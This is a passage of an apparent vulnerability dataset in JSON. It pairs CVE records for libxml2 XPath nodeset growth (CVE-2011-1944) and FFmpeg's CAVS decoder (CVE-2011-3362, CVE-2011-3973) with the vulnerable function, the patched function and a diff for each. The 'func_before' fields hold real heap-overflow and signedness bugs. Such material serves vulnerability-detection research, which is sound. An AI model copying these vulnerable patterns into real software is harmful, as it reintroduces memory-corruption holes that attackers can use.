ns->next, ns);\n\t} else\n\t    val1->nodeTab[val1->nodeNr++] = n2;\n    }\n\n    return(val1);\n}",
        "func": "xmlNodeSetPtr\nxmlXPathNodeSetMerge(xmlNodeSetPtr val1, xmlNodeSetPtr val2) {\n    int i, j, initNr, skip;\n    xmlNodePtr n1, n2;\n\n    if (val2 == NULL) return(val1);\n    if (val1 == NULL) {\n\tval1 = xmlXPathNodeSetCreate(NULL);\n    if (val1 == NULL)\n        return (NULL);\n#if 0\n\t/*\n\t* TODO: The optimization won't work in every case, since\n\t*  those nasty namespace nodes need to be added with\n\t*  xmlXPathNodeSetDupNs() to the set; thus a pure\n\t*  memcpy is not possible.\n\t*  If there was a flag on the nodesetval, indicating that\n\t*  some temporary nodes are in, that would be helpfull.\n\t*/\n\t/*\n\t* Optimization: Create an equally sized node-set\n\t* and memcpy the content.\n\t*/\n\tval1 = xmlXPathNodeSetCreateSize(val2->nodeNr);\n\tif (val1 == NULL)\n\t    return(NULL);\n\tif (val2->nodeNr != 0) {\n\t    if (val2->nodeNr == 1)\n\t\t*(val1->nodeTab) = *(val2->nodeTab);\n\t    else {\n\t\tmemcpy(val1->nodeTab, val2->nodeTab,\n\t\t    val2->nodeNr * sizeof(xmlNodePtr));\n\t    }\n\t    val1->nodeNr = val2->nodeNr;\n\t}\n\treturn(val1);\n#endif\n    }\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    initNr = val1->nodeNr;\n\n    for (i = 0;i < val2->nodeNr;i++) {\n\tn2 = val2->nodeTab[i];\n\t/*\n\t * check against duplicates\n\t */\n\tskip = 0;\n\tfor (j = 0; j < initNr; j++) {\n\t    n1 = val1->nodeTab[j];\n\t    if (n1 == n2) {\n\t\tskip = 1;\n\t\tbreak;\n\t    } else if ((n1->type == XML_NAMESPACE_DECL) &&\n\t\t       (n2->type == XML_NAMESPACE_DECL)) {\n\t\tif ((((xmlNsPtr) n1)->next == ((xmlNsPtr) n2)->next) &&\n\t\t    (xmlStrEqual(((xmlNsPtr) n1)->prefix,\n\t\t\t((xmlNsPtr) n2)->prefix)))\n\t\t{\n\t\t    skip = 1;\n\t\t    break;\n\t\t}\n\t    }\n\t}\n\tif (skip)\n\t    continue;\n\n\t/*\n\t * grow the nodeTab if needed\n\t */\n\tif (val1->nodeMax == 0) {\n\t    val1->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t\t    sizeof(xmlNodePtr));\n\t    if (val1->nodeTab == NULL) {\n\t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\treturn(NULL);\n\t    }\n\t    memset(val1->nodeTab, 0 ,\n\t\t   XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t    val1->nodeMax = XML_NODESET_DEFAULT;\n\t} else if (val1->nodeNr == val1->nodeMax) {\n\t    xmlNodePtr *temp;\n\n\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax * 2 *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\t    if (temp == NULL) {\n\t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\treturn(NULL);\n\t    }\n\t    val1->nodeTab = temp;\n\t    val1->nodeMax *= 2;\n\t}\n\tif (n2->type == XML_NAMESPACE_DECL) {\n\t    xmlNsPtr ns = (xmlNsPtr) n2;\n\n\t    val1->nodeTab[val1->nodeNr++] =\n\t\txmlXPathNodeSetDupNs((xmlNodePtr) ns->next, ns);\n\t} else\n\t    val1->nodeTab[val1->nodeNr++] = n2;\n    }\n\n    return(val1);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -81,14 +81,14 @@\n \t} else if (val1->nodeNr == val1->nodeMax) {\n \t    xmlNodePtr *temp;\n \n-\t    val1->nodeMax *= 2;\n-\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax *\n+\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax * 2 *\n \t\t\t\t\t     sizeof(xmlNodePtr));\n \t    if (temp == NULL) {\n \t        xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\treturn(NULL);\n \t    }\n \t    val1->nodeTab = temp;\n+\t    val1->nodeMax *= 2;\n \t}\n \tif (n2->type == XML_NAMESPACE_DECL) {\n \t    xmlNsPtr ns = (xmlNsPtr) n2;",
        "diff_line_info": {
            "deleted_lines": [
                "\t    val1->nodeMax *= 2;",
                "\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax *"
            ],
            "added_lines": [
                "\t    temp = (xmlNodePtr *) xmlRealloc(val1->nodeTab, val1->nodeMax * 2 *",
                "\t    val1->nodeMax *= 2;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1944",
        "func_name": "GNOME/libxml2/xmlXPathNodeSetAddNs",
        "description": "Integer overflow in xpath.c in libxml2 2.6.x through 2.6.32 and 2.7.x through 2.7.8, and libxml 1.8.16 and earlier, allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted XML file that triggers a heap-based buffer overflow when adding a new namespace node, related to handling of XPath expressions.",
        "git_url": "https://github.com/GNOME/libxml2/commit/d7958b21e7f8c447a26bb2436f08402b2c308be4",
        "commit_title": "Fix some potential problems on reallocation failures",
        "commit_text": " The count was incremented before the allocation and not fixed in case of failure * xpath.c: corrects a few instances where the available count of some            structure is updated before we know the allocation actually            succeeds",
        "func_before": "void\nxmlXPathNodeSetAddNs(xmlNodeSetPtr cur, xmlNodePtr node, xmlNsPtr ns) {\n    int i;\n\n\n    if ((cur == NULL) || (ns == NULL) || (node == NULL) ||\n        (ns->type != XML_NAMESPACE_DECL) ||\n\t(node->type != XML_ELEMENT_NODE))\n\treturn;\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    /*\n     * prevent duplicates\n     */\n    for (i = 0;i < cur->nodeNr;i++) {\n        if ((cur->nodeTab[i] != NULL) &&\n\t    (cur->nodeTab[i]->type == XML_NAMESPACE_DECL) &&\n\t    (((xmlNsPtr)cur->nodeTab[i])->next == (xmlNsPtr) node) &&\n\t    (xmlStrEqual(ns->prefix, ((xmlNsPtr)cur->nodeTab[i])->prefix)))\n\t    return;\n    }\n\n    /*\n     * grow the nodeTab if needed\n     */\n    if (cur->nodeMax == 0) {\n        cur->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\tif (cur->nodeTab == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tmemset(cur->nodeTab, 0 ,\n\t       XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n        cur->nodeMax = XML_NODESET_DEFAULT;\n    } else if (cur->nodeNr == cur->nodeMax) {\n        xmlNodePtr *temp;\n\n        cur->nodeMax *= 2;\n\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n\t\t\t\t      sizeof(xmlNodePtr));\n\tif (temp == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tcur->nodeTab = temp;\n    }\n    cur->nodeTab[cur->nodeNr++] = xmlXPathNodeSetDupNs(node, ns);\n}",
        "func": "void\nxmlXPathNodeSetAddNs(xmlNodeSetPtr cur, xmlNodePtr node, xmlNsPtr ns) {\n    int i;\n\n\n    if ((cur == NULL) || (ns == NULL) || (node == NULL) ||\n        (ns->type != XML_NAMESPACE_DECL) ||\n\t(node->type != XML_ELEMENT_NODE))\n\treturn;\n\n    /* @@ with_ns to check whether namespace nodes should be looked at @@ */\n    /*\n     * prevent duplicates\n     */\n    for (i = 0;i < cur->nodeNr;i++) {\n        if ((cur->nodeTab[i] != NULL) &&\n\t    (cur->nodeTab[i]->type == XML_NAMESPACE_DECL) &&\n\t    (((xmlNsPtr)cur->nodeTab[i])->next == (xmlNsPtr) node) &&\n\t    (xmlStrEqual(ns->prefix, ((xmlNsPtr)cur->nodeTab[i])->prefix)))\n\t    return;\n    }\n\n    /*\n     * grow the nodeTab if needed\n     */\n    if (cur->nodeMax == 0) {\n        cur->nodeTab = (xmlNodePtr *) xmlMalloc(XML_NODESET_DEFAULT *\n\t\t\t\t\t     sizeof(xmlNodePtr));\n\tif (cur->nodeTab == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n\tmemset(cur->nodeTab, 0 ,\n\t       XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n        cur->nodeMax = XML_NODESET_DEFAULT;\n    } else if (cur->nodeNr == cur->nodeMax) {\n        xmlNodePtr *temp;\n\n\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n\t\t\t\t      sizeof(xmlNodePtr));\n\tif (temp == NULL) {\n\t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n\t    return;\n\t}\n        cur->nodeMax *= 2;\n\tcur->nodeTab = temp;\n    }\n    cur->nodeTab[cur->nodeNr++] = xmlXPathNodeSetDupNs(node, ns);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -36,13 +36,13 @@\n     } else if (cur->nodeNr == cur->nodeMax) {\n         xmlNodePtr *temp;\n \n-        cur->nodeMax *= 2;\n-\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *\n+\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *\n \t\t\t\t      sizeof(xmlNodePtr));\n \tif (temp == NULL) {\n \t    xmlXPathErrMemory(NULL, \"growing nodeset\\n\");\n \t    return;\n \t}\n+        cur->nodeMax *= 2;\n \tcur->nodeTab = temp;\n     }\n     cur->nodeTab[cur->nodeNr++] = xmlXPathNodeSetDupNs(node, ns);",
        "diff_line_info": {
            "deleted_lines": [
                "        cur->nodeMax *= 2;",
                "\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax *"
            ],
            "added_lines": [
                "\ttemp = (xmlNodePtr *) xmlRealloc(cur->nodeTab, cur->nodeMax * 2 *",
                "        cur->nodeMax *= 2;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1944",
        "func_name": "GNOME/libxml2/xmlXPathNodeSetMergeAndClear",
        "description": "Integer overflow in xpath.c in libxml2 2.6.x through 2.6.32 and 2.7.x through 2.7.8, and libxml 1.8.16 and earlier, allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted XML file that triggers a heap-based buffer overflow when adding a new namespace node, related to handling of XPath expressions.",
        "git_url": "https://github.com/GNOME/libxml2/commit/d7958b21e7f8c447a26bb2436f08402b2c308be4",
        "commit_title": "Fix some potential problems on reallocation failures",
        "commit_text": " The count was incremented before the allocation and not fixed in case of failure * xpath.c: corrects a few instances where the available count of some            structure is updated before we know the allocation actually            succeeds",
        "func_before": "static xmlNodeSetPtr\nxmlXPathNodeSetMergeAndClear(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n\t\t\t     int hasNullEntries)\n{\n    if ((set1 == NULL) && (hasNullEntries == 0)) {\n\t/*\n\t* Note that doing a memcpy of the list, namespace nodes are\n\t* just assigned to set1, since set2 is cleared anyway.\n\t*/\n\tset1 = xmlXPathNodeSetCreateSize(set2->nodeNr);\n\tif (set1 == NULL)\n\t    return(NULL);\n\tif (set2->nodeNr != 0) {\n\t    memcpy(set1->nodeTab, set2->nodeTab,\n\t\tset2->nodeNr * sizeof(xmlNodePtr));\n\t    set1->nodeNr = set2->nodeNr;\n\t}\n    } else {\n\tint i, j, initNbSet1;\n\txmlNodePtr n1, n2;\n\n\tif (set1 == NULL)\n            set1 = xmlXPathNodeSetCreate(NULL);\n        if (set1 == NULL)\n            return (NULL);\n\n\tinitNbSet1 = set1->nodeNr;\n\tfor (i = 0;i < set2->nodeNr;i++) {\n\t    n2 = set2->nodeTab[i];\n\t    /*\n\t    * Skip NULLed entries.\n\t    */\n\t    if (n2 == NULL)\n\t\tcontinue;\n\t    /*\n\t    * Skip duplicates.\n\t    */\n\t    for (j = 0; j < initNbSet1; j++) {\n\t\tn1 = set1->nodeTab[j];\n\t\tif (n1 == n2) {\n\t\t    goto skip_node;\n\t\t} else if ((n1->type == XML_NAMESPACE_DECL) &&\n\t\t    (n2->type == XML_NAMESPACE_DECL))\n\t\t{\n\t\t    if ((((xmlNsPtr) n1)->next == ((xmlNsPtr) n2)->next) &&\n\t\t\t(xmlStrEqual(((xmlNsPtr) n1)->prefix,\n\t\t\t((xmlNsPtr) n2)->prefix)))\n\t\t    {\n\t\t\t/*\n\t\t\t* Free the namespace node.\n\t\t\t*/\n\t\t\tset2->nodeTab[i] = NULL;\n\t\t\txmlXPathNodeSetFreeNs((xmlNsPtr) n2);\n\t\t\tgoto skip_node;\n\t\t    }\n\t\t}\n\t    }\n\t    /*\n\t    * grow the nodeTab if needed\n\t    */\n\t    if (set1->nodeMax == 0) {\n\t\tset1->nodeTab = (xmlNodePtr *) xmlMalloc(\n\t\t    XML_NODESET_DEFAULT * sizeof(xmlNodePtr));\n\t\tif (set1->nodeTab == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tmemset(set1->nodeTab, 0,\n\t\t    XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t\tset1->nodeMax = XML_NODESET_DEFAULT;\n\t    } else if (set1->nodeNr >= set1->nodeMax) {\n\t\txmlNodePtr *temp;\n\n\t\tset1->nodeMax *= 2;\n\t\ttemp = (xmlNodePtr *) xmlRealloc(\n\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n\t\tif (temp == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tset1->nodeTab = temp;\n\t    }\n\t    if (n2->type == XML_NAMESPACE_DECL) {\n\t\txmlNsPtr ns = (xmlNsPtr) n2;\n\n\t\tset1->nodeTab[set1->nodeNr++] =\n\t\t    xmlXPathNodeSetDupNs((xmlNodePtr) ns->next, ns);\n\t    } else\n\t\tset1->nodeTab[set1->nodeNr++] = n2;\nskip_node:\n\t    {}\n\t}\n    }\n    set2->nodeNr = 0;\n    return(set1);\n}",
        "func": "static xmlNodeSetPtr\nxmlXPathNodeSetMergeAndClear(xmlNodeSetPtr set1, xmlNodeSetPtr set2,\n\t\t\t     int hasNullEntries)\n{\n    if ((set1 == NULL) && (hasNullEntries == 0)) {\n\t/*\n\t* Note that doing a memcpy of the list, namespace nodes are\n\t* just assigned to set1, since set2 is cleared anyway.\n\t*/\n\tset1 = xmlXPathNodeSetCreateSize(set2->nodeNr);\n\tif (set1 == NULL)\n\t    return(NULL);\n\tif (set2->nodeNr != 0) {\n\t    memcpy(set1->nodeTab, set2->nodeTab,\n\t\tset2->nodeNr * sizeof(xmlNodePtr));\n\t    set1->nodeNr = set2->nodeNr;\n\t}\n    } else {\n\tint i, j, initNbSet1;\n\txmlNodePtr n1, n2;\n\n\tif (set1 == NULL)\n            set1 = xmlXPathNodeSetCreate(NULL);\n        if (set1 == NULL)\n            return (NULL);\n\n\tinitNbSet1 = set1->nodeNr;\n\tfor (i = 0;i < set2->nodeNr;i++) {\n\t    n2 = set2->nodeTab[i];\n\t    /*\n\t    * Skip NULLed entries.\n\t    */\n\t    if (n2 == NULL)\n\t\tcontinue;\n\t    /*\n\t    * Skip duplicates.\n\t    */\n\t    for (j = 0; j < initNbSet1; j++) {\n\t\tn1 = set1->nodeTab[j];\n\t\tif (n1 == n2) {\n\t\t    goto skip_node;\n\t\t} else if ((n1->type == XML_NAMESPACE_DECL) &&\n\t\t    (n2->type == XML_NAMESPACE_DECL))\n\t\t{\n\t\t    if ((((xmlNsPtr) n1)->next == ((xmlNsPtr) n2)->next) &&\n\t\t\t(xmlStrEqual(((xmlNsPtr) n1)->prefix,\n\t\t\t((xmlNsPtr) n2)->prefix)))\n\t\t    {\n\t\t\t/*\n\t\t\t* Free the namespace node.\n\t\t\t*/\n\t\t\tset2->nodeTab[i] = NULL;\n\t\t\txmlXPathNodeSetFreeNs((xmlNsPtr) n2);\n\t\t\tgoto skip_node;\n\t\t    }\n\t\t}\n\t    }\n\t    /*\n\t    * grow the nodeTab if needed\n\t    */\n\t    if (set1->nodeMax == 0) {\n\t\tset1->nodeTab = (xmlNodePtr *) xmlMalloc(\n\t\t    XML_NODESET_DEFAULT * sizeof(xmlNodePtr));\n\t\tif (set1->nodeTab == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tmemset(set1->nodeTab, 0,\n\t\t    XML_NODESET_DEFAULT * (size_t) sizeof(xmlNodePtr));\n\t\tset1->nodeMax = XML_NODESET_DEFAULT;\n\t    } else if (set1->nodeNr >= set1->nodeMax) {\n\t\txmlNodePtr *temp;\n\n\t\ttemp = (xmlNodePtr *) xmlRealloc(\n\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n\t\tif (temp == NULL) {\n\t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n\t\t    return(NULL);\n\t\t}\n\t\tset1->nodeTab = temp;\n\t\tset1->nodeMax *= 2;\n\t    }\n\t    if (n2->type == XML_NAMESPACE_DECL) {\n\t\txmlNsPtr ns = (xmlNsPtr) n2;\n\n\t\tset1->nodeTab[set1->nodeNr++] =\n\t\t    xmlXPathNodeSetDupNs((xmlNodePtr) ns->next, ns);\n\t    } else\n\t\tset1->nodeTab[set1->nodeNr++] = n2;\nskip_node:\n\t    {}\n\t}\n    }\n    set2->nodeNr = 0;\n    return(set1);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -71,14 +71,14 @@\n \t    } else if (set1->nodeNr >= set1->nodeMax) {\n \t\txmlNodePtr *temp;\n \n-\t\tset1->nodeMax *= 2;\n \t\ttemp = (xmlNodePtr *) xmlRealloc(\n-\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));\n+\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));\n \t\tif (temp == NULL) {\n \t\t    xmlXPathErrMemory(NULL, \"merging nodeset\\n\");\n \t\t    return(NULL);\n \t\t}\n \t\tset1->nodeTab = temp;\n+\t\tset1->nodeMax *= 2;\n \t    }\n \t    if (n2->type == XML_NAMESPACE_DECL) {\n \t\txmlNsPtr ns = (xmlNsPtr) n2;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tset1->nodeMax *= 2;",
                "\t\t    set1->nodeTab, set1->nodeMax * sizeof(xmlNodePtr));"
            ],
            "added_lines": [
                "\t\t    set1->nodeTab, set1->nodeMax * 2 * sizeof(xmlNodePtr));",
                "\t\tset1->nodeMax *= 2;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3362",
        "func_name": "ffmpeg/decode_residual_block",
        "description": "Integer signedness error in the decode_residual_block function in cavsdec.c in libavcodec in FFmpeg before 0.7.3 and 0.8.x before 0.8.2, and libav through 0.7.1, allows remote attackers to cause a denial of service (memory corruption and application crash) or possibly execute arbitrary code via a crafted Chinese AVS video (aka CAVS) file.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=91d5da9321c52e8197fb14046ebb335f3e6ff4a0",
        "commit_title": "",
        "commit_text": "cavs: fix oCERT #2011-002 FFmpeg/libavcodec insufficient boundary check  ",
        "func_before": "static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                 const struct dec_2dvlc *r, int esc_golomb_order,\n                                 int qp, uint8_t *dst, int stride) {\n    int i, level_code, esc_code, level, run, mask;\n    DCTELEM level_buf[65];\n    uint8_t run_buf[65];\n    DCTELEM *block = h->block;\n\n    for(i=0;i<65;i++) {\n        level_code = get_ue_code(gb,r->golomb_order);\n        if(level_code >= ESCAPE_CODE) {\n            run = ((level_code - ESCAPE_CODE) >> 1) + 1;\n            esc_code = get_ue_code(gb,esc_golomb_order);\n            level = esc_code + (run > r->max_run ? 1 : r->level_add[run]);\n            while(level > r->inc_limit)\n                r++;\n            mask = -(level_code & 1);\n            level = (level^mask) - mask;\n        } else {\n            level = r->rltab[level_code][0];\n            if(!level) //end of block signal\n                break;\n            run   = r->rltab[level_code][1];\n            r += r->rltab[level_code][2];\n        }\n        level_buf[i] = level;\n        run_buf[i] = run;\n    }\n    if(dequant(h,level_buf, run_buf, block, ff_cavs_dequant_mul[qp],\n               ff_cavs_dequant_shift[qp], i))\n        return -1;\n    h->cdsp.cavs_idct8_add(dst,block,stride);\n    h->s.dsp.clear_block(block);\n    return 0;\n}",
        "func": "static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                 const struct dec_2dvlc *r, int esc_golomb_order,\n                                 int qp, uint8_t *dst, int stride) {\n    int i, esc_code, level, mask;\n    unsigned int level_code, run;\n    DCTELEM level_buf[65];\n    uint8_t run_buf[65];\n    DCTELEM *block = h->block;\n\n    for(i=0;i<65;i++) {\n        level_code = get_ue_code(gb,r->golomb_order);\n        if(level_code >= ESCAPE_CODE) {\n            run = ((level_code - ESCAPE_CODE) >> 1) + 1;\n            esc_code = get_ue_code(gb,esc_golomb_order);\n            level = esc_code + (run > r->max_run ? 1 : r->level_add[run]);\n            while(level > r->inc_limit)\n                r++;\n            mask = -(level_code & 1);\n            level = (level^mask) - mask;\n        } else {\n            level = r->rltab[level_code][0];\n            if(!level) //end of block signal\n                break;\n            run   = r->rltab[level_code][1];\n            r += r->rltab[level_code][2];\n        }\n        level_buf[i] = level;\n        run_buf[i] = run;\n    }\n    if(dequant(h,level_buf, run_buf, block, ff_cavs_dequant_mul[qp],\n               ff_cavs_dequant_shift[qp], i))\n        return -1;\n    h->cdsp.cavs_idct8_add(dst,block,stride);\n    h->s.dsp.clear_block(block);\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,7 +1,8 @@\n static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                  const struct dec_2dvlc *r, int esc_golomb_order,\n                                  int qp, uint8_t *dst, int stride) {\n-    int i, level_code, esc_code, level, run, mask;\n+    int i, esc_code, level, mask;\n+    unsigned int level_code, run;\n     DCTELEM level_buf[65];\n     uint8_t run_buf[65];\n     DCTELEM *block = h->block;",
        "diff_line_info": {
            "deleted_lines": [
                "    int i, level_code, esc_code, level, run, mask;"
            ],
            "added_lines": [
                "    int i, esc_code, level, mask;",
                "    unsigned int level_code, run;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3973",
        "func_name": "ffmpeg/decode_mb_i",
        "description": "cavsdec.c in libavcodec in FFmpeg before 0.7.4 and 0.8.x before 0.8.3 allows remote attackers to cause a denial of service (incorrect write operation and application crash) via an invalid bitstream in a Chinese AVS video (aka CAVS) file, related to the decode_residual_block, check_for_slice, and cavs_decode_frame functions, a different vulnerability than CVE-2011-3362.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=bd968d260aef322fb32e254a3de0d2036c57bd56",
        "commit_title": "",
        "commit_text": "cavs: fix some crashes with invalid bitstreams  This removes all valgrind-reported invalid writes with one specific test file.  Fixes http://www.ocert.org/advisories/ocert-2011-002.html  (cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78) ",
        "func_before": "static int decode_mb_i(AVSContext *h, int cbp_code) {\n    GetBitContext *gb = &h->s.gb;\n    int block, pred_mode_uv;\n    uint8_t top[18];\n    uint8_t *left = NULL;\n    uint8_t *d;\n\n    ff_cavs_init_mb(h);\n\n    /* get intra prediction modes from stream */\n    for(block=0;block<4;block++) {\n        int nA,nB,predpred;\n        int pos = ff_cavs_scan3x3[block];\n\n        nA = h->pred_mode_Y[pos-1];\n        nB = h->pred_mode_Y[pos-3];\n        predpred = FFMIN(nA,nB);\n        if(predpred == NOT_AVAIL) // if either is not available\n            predpred = INTRA_L_LP;\n        if(!get_bits1(gb)){\n            int rem_mode= get_bits(gb, 2);\n            predpred = rem_mode + (rem_mode >= predpred);\n        }\n        h->pred_mode_Y[pos] = predpred;\n    }\n    pred_mode_uv = get_ue_golomb(gb);\n    if(pred_mode_uv > 6) {\n        av_log(h->s.avctx, AV_LOG_ERROR, \"illegal intra chroma pred mode\\n\");\n        return -1;\n    }\n    ff_cavs_modify_mb_i(h, &pred_mode_uv);\n\n    /* get coded block pattern */\n    if(h->pic_type == AV_PICTURE_TYPE_I)\n        cbp_code = get_ue_golomb(gb);\n    if(cbp_code > 63){\n        av_log(h->s.avctx, AV_LOG_ERROR, \"illegal intra cbp\\n\");\n        return -1;\n    }\n    h->cbp = cbp_tab[cbp_code][0];\n    if(h->cbp && !h->qp_fixed)\n        h->qp = (h->qp + get_se_golomb(gb)) & 63; //qp_delta\n\n    /* luma intra prediction interleaved with residual decode/transform/add */\n    for(block=0;block<4;block++) {\n        d = h->cy + h->luma_scan[block];\n        ff_cavs_load_intra_pred_luma(h, top, &left, block);\n        h->intra_pred_l[h->pred_mode_Y[ff_cavs_scan3x3[block]]]\n            (d, top, left, h->l_stride);\n        if(h->cbp & (1<<block))\n            decode_residual_block(h,gb,ff_cavs_intra_dec,1,h->qp,d,h->l_stride);\n    }\n\n    /* chroma intra prediction */\n    ff_cavs_load_intra_pred_chroma(h);\n    h->intra_pred_c[pred_mode_uv](h->cu, &h->top_border_u[h->mbx*10],\n                                  h->left_border_u, h->c_stride);\n    h->intra_pred_c[pred_mode_uv](h->cv, &h->top_border_v[h->mbx*10],\n                                  h->left_border_v, h->c_stride);\n\n    decode_residual_chroma(h);\n    ff_cavs_filter(h,I_8X8);\n    set_mv_intra(h);\n    return 0;\n}",
        "func": "static int decode_mb_i(AVSContext *h, int cbp_code) {\n    GetBitContext *gb = &h->s.gb;\n    unsigned pred_mode_uv;\n    int block;\n    uint8_t top[18];\n    uint8_t *left = NULL;\n    uint8_t *d;\n\n    ff_cavs_init_mb(h);\n\n    /* get intra prediction modes from stream */\n    for(block=0;block<4;block++) {\n        int nA,nB,predpred;\n        int pos = ff_cavs_scan3x3[block];\n\n        nA = h->pred_mode_Y[pos-1];\n        nB = h->pred_mode_Y[pos-3];\n        predpred = FFMIN(nA,nB);\n        if(predpred == NOT_AVAIL) // if either is not available\n            predpred = INTRA_L_LP;\n        if(!get_bits1(gb)){\n            int rem_mode= get_bits(gb, 2);\n            predpred = rem_mode + (rem_mode >= predpred);\n        }\n        h->pred_mode_Y[pos] = predpred;\n    }\n    pred_mode_uv = get_ue_golomb(gb);\n    if(pred_mode_uv > 6) {\n        av_log(h->s.avctx, AV_LOG_ERROR, \"illegal intra chroma pred mode\\n\");\n        return -1;\n    }\n    ff_cavs_modify_mb_i(h, &pred_mode_uv);\n\n    /* get coded block pattern */\n    if(h->pic_type == AV_PICTURE_TYPE_I)\n        cbp_code = get_ue_golomb(gb);\n    if(cbp_code > 63){\n        av_log(h->s.avctx, AV_LOG_ERROR, \"illegal intra cbp\\n\");\n        return -1;\n    }\n    h->cbp = cbp_tab[cbp_code][0];\n    if(h->cbp && !h->qp_fixed)\n        h->qp = (h->qp + get_se_golomb(gb)) & 63; //qp_delta\n\n    /* luma intra prediction interleaved with residual decode/transform/add */\n    for(block=0;block<4;block++) {\n        d = h->cy + h->luma_scan[block];\n        ff_cavs_load_intra_pred_luma(h, top, &left, block);\n        h->intra_pred_l[h->pred_mode_Y[ff_cavs_scan3x3[block]]]\n            (d, top, left, h->l_stride);\n        if(h->cbp & (1<<block))\n            decode_residual_block(h,gb,ff_cavs_intra_dec,1,h->qp,d,h->l_stride);\n    }\n\n    /* chroma intra prediction */\n    ff_cavs_load_intra_pred_chroma(h);\n    h->intra_pred_c[pred_mode_uv](h->cu, &h->top_border_u[h->mbx*10],\n                                  h->left_border_u, h->c_stride);\n    h->intra_pred_c[pred_mode_uv](h->cv, &h->top_border_v[h->mbx*10],\n                                  h->left_border_v, h->c_stride);\n\n    decode_residual_chroma(h);\n    ff_cavs_filter(h,I_8X8);\n    set_mv_intra(h);\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,7 @@\n static int decode_mb_i(AVSContext *h, int cbp_code) {\n     GetBitContext *gb = &h->s.gb;\n-    int block, pred_mode_uv;\n+    unsigned pred_mode_uv;\n+    int block;\n     uint8_t top[18];\n     uint8_t *left = NULL;\n     uint8_t *d;",
        "diff_line_info": {
            "deleted_lines": [
                "    int block, pred_mode_uv;"
            ],
            "added_lines": [
                "    unsigned pred_mode_uv;",
                "    int block;"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-3973",
        "func_name": "ffmpeg/cavs_decode_frame",
        "description": "cavsdec.c in libavcodec in FFmpeg before 0.7.4 and 0.8.x before 0.8.3 allows remote attackers to cause a denial of service (incorrect write operation and application crash) via an invalid bitstream in a Chinese AVS video (aka CAVS) file, related to the decode_residual_block, check_for_slice, and cavs_decode_frame functions, a different vulnerability than CVE-2011-3362.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=bd968d260aef322fb32e254a3de0d2036c57bd56",
        "commit_title": "",
        "commit_text": "cavs: fix some crashes with invalid bitstreams  This removes all valgrind-reported invalid writes with one specific test file.  Fixes http://www.ocert.org/advisories/ocert-2011-002.html  (cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78) ",
